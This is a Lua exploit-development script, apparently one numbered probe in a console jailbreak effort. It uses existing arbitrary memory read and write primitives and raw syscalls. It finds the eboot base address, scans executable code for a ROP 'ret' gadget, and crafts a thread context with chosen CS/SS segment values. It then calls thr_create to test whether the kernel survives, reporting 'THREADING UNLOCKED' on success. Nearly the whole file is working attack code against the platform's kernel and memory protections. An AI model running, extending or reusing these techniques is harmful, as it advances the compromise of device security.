-- CRASH_CLASS: HIGH
-- PROBE 56o: Minimal thr_create(430) with CS=0x43 — no native.read_buffer
--
-- Context: 56n produced 0 bytes, likely errored on native.read_buffer.
-- This probe uses only memory.alloc/read_dword/write_dword.
-- Sets RIP=0 (thread will SIGSEGV at user-mode, which is fine —
-- the test is whether the KERNEL PANICS or not).

print("=== PROBE 56o: MINIMAL THR_CREATE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

collectgarbage("stop")

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

-- Step 1: Allocate stack for new thread
print("Allocating stack...")
local sc_mmap = make_syscall(477)
local ok_stk, new_stack = pcall(function()
    return sc_mmap(uint64(0), uint64(0x10000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
local stk_h, stk_l = get_hi_lo(new_stack)
print(string.format("stack: 0x%X_%08X ok=%s", stk_h, stk_l, tostring(ok_stk)))

if not ok_stk or stk_h == 0xFFFFFFFF then
    print("Stack alloc failed!")
    print("canary=" .. pid)
    return
end

-- Step 2: Find an infinite loop or ret gadget via simple scan
-- Use the eboot base from dynlib_get_info
print("Getting eboot base...")
local sc_info = make_syscall(593)
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
pcall(function() sc_info(uint64(0), info) end)
local eboot_lo = safe_rd(info + 0x108)
local eboot_hi = safe_rd(info + 0x10C)
print(string.format("eboot text: 0x%X_%08X", eboot_hi or 0, eboot_lo or 0))

-- Scan for 0xC3 (ret) using memory.read_dword (safe, no native.read_buffer)
local ret_addr = nil
if eboot_lo and eboot_hi then
    print("Scanning for ret gadget...")
    for off = 0, 0xFFF, 4 do
        local dw = safe_rd(uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + off)))
        if dw then
            -- Check each byte for 0xC3
            for b = 0, 3 do
                local byte_val = math.floor(dw / (256 ^ b)) % 256
                if byte_val == 0xC3 then
                    ret_addr = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + off + b))
                    print("  ret at eboot+" .. string.format("0x%X", off + b) .. " = " .. fmt_addr(ret_addr))
                    break
                end
            end
            if ret_addr then break end
        else
            -- Can't read this address — might be XO
            print("  read failed at offset " .. string.format("0x%X", off) .. " — XO?")
            break
        end
    end
end

-- Step 3: Build ucontext
print("")
print("--- BUILDING UCONTEXT ---")
local uctx = memory.alloc(0x500)
-- Zero it
for i = 0, 0x1FF, 4 do
    safe_wd(uctx + i, 0)
end

local mc = to_num(uctx) + 0x10

-- mc_rip — use ret gadget if found, else set to 0 (thread will SIGSEGV)
if ret_addr then
    local ra_h, ra_l = get_hi_lo(ret_addr)
    safe_wd(mc + 0xB0, ra_l)
    safe_wd(mc + 0xB4, ra_h)
    print("RIP = ret gadget " .. fmt_addr(ret_addr))
else
    -- Set RIP to 0 — thread will immediately fault at ring 3
    -- Kernel should handle this as SIGSEGV, NOT panic
    safe_wd(mc + 0xB0, 0)
    safe_wd(mc + 0xB4, 0)
    print("RIP = 0x0 (will SIGSEGV, testing if kernel handles it)")
end

-- CS = 0x43 (THE FIX)
safe_wd(mc + 0xB8, 0x43)

-- RFLAGS = 0x202
safe_wd(mc + 0xC0, 0x202)

-- RSP = top of stack
local sp_l = stk_l + 0x10000 - 0x100
safe_wd(mc + 0xC8, sp_l)
safe_wd(mc + 0xCC, stk_h)

-- SS = 0x3B (THE FIX)
safe_wd(mc + 0xD0, 0x3B)

-- RBP = RSP
safe_wd(mc + 0x48, sp_l)
safe_wd(mc + 0x4C, stk_h)

-- Verify
print(string.format("CS=0x%X SS=0x%X RFLAGS=0x%X",
    safe_rd(mc + 0xB8) or 0, safe_rd(mc + 0xD0) or 0, safe_rd(mc + 0xC0) or 0))
print(string.format("RSP=0x%X_%08X", safe_rd(mc + 0xCC) or 0, safe_rd(mc + 0xC8) or 0))

-- Step 4: TID output
local tid_out = memory.alloc(16)
safe_wq(tid_out, uint64(0))

-- Step 5: CALL thr_create!
print("")
print("*** CALLING thr_create(430) with CS=0x43, SS=0x3B ***")
print("PRE canary=" .. to_num(syscall.getpid()))

local sc_thr = make_syscall(430)
local ok_tc, ret_tc = pcall(function()
    return sc_thr(uint64(to_num(uctx)), uint64(to_num(tid_out)), uint64(0))
end)

print("*** POST-CALL ***")
print("ok=" .. tostring(ok_tc) .. " ret=" .. tostring(ret_tc))

local new_tid = safe_rq(tid_out)
local tid_n = to_num(new_tid)
print("TID=" .. tid_n)
print("POST canary=" .. to_num(syscall.getpid()))

if ok_tc and to_num(ret_tc) == 0 and tid_n > 0 then
    print("")
    print("!!! THR_CREATE SUCCEEDED — NO KERNEL PANIC !!!")

    -- Check thread existence
    local sc_thr_kill = make_syscall(433)
    local ok_tk, ret_tk = pcall(function()
        return sc_thr_kill(uint64(tid_n), uint64(0))
    end)
    print("thr_kill(tid=" .. tid_n .. ",0): ret=" .. tostring(ret_tk))

    -- Get self TID
    local sc_thr_self = make_syscall(432)
    local stid = memory.alloc(16)
    pcall(function() sc_thr_self(uint64(to_num(stid))) end)
    print("self_tid=" .. to_num(safe_rq(stid)))

    print("")
    print("*** THREADING UNLOCKED ***")
elseif ok_tc then
    print("thr_create returned " .. tostring(ret_tc) .. " (non-zero = error, but no panic!)")
else
    print("pcall failed — thread syscall caused exception in this process")
end

print("")
print("canary=" .. to_num(syscall.getpid()))
print("=== PROBE 56o COMPLETE ===")
